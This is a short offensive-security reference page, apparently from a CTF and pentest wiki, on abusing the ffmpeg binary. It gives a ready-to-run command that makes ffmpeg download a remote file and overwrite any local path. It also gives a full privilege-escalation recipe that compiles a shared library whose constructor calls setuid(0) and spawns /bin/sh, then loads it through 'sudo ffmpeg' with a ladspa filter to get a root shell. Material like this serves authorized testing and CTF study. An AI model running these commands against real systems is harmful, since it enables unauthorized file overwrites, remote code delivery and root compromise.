---
title: ffmpeg
description: A reference on features of the ffmpeg binary, relevant for security testing, exploiting and CTF.
---

## Arbitrary file write/download

`ffmpeg` can be abused as a substitute for `wget -o`. With the correct flags being set, `ffmpeg` will happily download and
write any arbitrary data to a file without modifying the data in any way. `ffmpeg` will even overwrite existing files.

```bash "-i https://example.com/file/to/download" "-f data file:/path/to/write/to.txt"
ffmpeg -y -f lavfi -i anullsrc=r=44100:cl=mono -f data -i https://example.com/file/to/download -c copy -map 1 -f data file:/path/to/write/to.txt
```

- Second `-i`: The file to download and later write to the local filesystem.
- `-f data file:`: The path to write the contents of the downloaded file to.

## Code execution/Privilege escalation

We can make ffmpeg execute arbitrary code by making it load a shared library which we add our payload as a constructor
to. Combining this with [arbitrary file write/download], we can upload a shared library to the target server and then
run this shared library to gain arbitrary RCE via the network.

To exploit ffmpeg's shared library loading, we can invoke it like so. [4]

```bash
TD=$(mktemp -d)
printf "\x52\x49\x46\x46\x24\x00\x00\x00\x57\x41\x56\x45\x66\x6d\x74\x20\x10\x00\x00\x00\x01\x00\x01\x00\x22\x56\x00\x00\x22\x56\x00\x00\x01\x00\x08\x00\x64\x61\x74\x61\x00\x00\x00\x00" > "$TD/any.wav"
echo -e '#include <unistd.h>\n#include <stdlib.h>\n__attribute__((constructor)) static void setup(void) {\nsetgid(0);\nsetuid(0);\nsystem("/bin/sh -c reset");\nsystem("/bin/sh");\n}' | gcc -x c -shared -fPIC -o $TD/libgtfo.so -
sudo ffmpeg -i $TD/any.wav -af "ladspa=file=$TD/libgtfo.so" -f null a.wav
```


## References

1. [Official ffmpeg website](https://ffmpeg.org/)
2. [Official ffmpeg documentation](https://ffmpeg.org/ffmpeg.html)
3. [ffmpeg GitHub repository](https://github.com/FFmpeg/FFmpeg)
4. [Loading shared library with ffmpeg for code execution](https://github.com/GTFOBins/GTFOBins.github.io/pull/482)
